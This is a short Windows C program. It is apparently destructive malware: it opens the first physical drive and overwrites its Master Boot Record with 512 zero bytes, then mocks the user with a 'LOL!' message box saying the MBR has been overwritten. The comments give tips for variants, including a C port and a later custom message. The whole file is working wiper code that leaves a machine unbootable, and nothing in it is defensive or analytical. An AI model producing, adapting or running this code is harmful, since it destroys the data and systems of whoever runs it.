#include <Windows.h>

/*You can use CreateFileA instead of CreateFileW if you're overwriting the Master Boot Record (MBR) with zeros, but please note that you have to change L"\\\\.\\PhysicalDrive0" to "\\\\.\\PhysicalDrive0" if you're using CreateFileA.
You don't need to use const "unsigned" char if you're overwriting the Master Boot Record (MBR) with zeros, const char or char is really enough for that.
If you want to overwrite the Master Boot Record in the C programming language, you have to replace const unsigned char MBR_Data[512] = {} with const unsigned char MBR_Data[512].*/

//MBR data, just zeros, overwritting MBR with a custom message later ;)
//Size of MBR is just 512 bytes
const unsigned char MBR_Data[512] = {};

//Main
INT
WINAPI
wWinMain(
	_In_	 HINSTANCE hInstance,
	_In_opt_ HINSTANCE PrevInstance,
	_In_	 PWSTR 	   szCmdLine,
	_In_	 INT       nShowCmd
) {
	DWORD BytesWritten;
	HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
	CloseHandle(hMBR);

	//Message box
	MessageBoxW(NULL, L"Your Master Boot Record(MBR) has been overwritten!\nEnjoy!", L"LOL!", MB_OK | MB_ICONINFORMATION);
}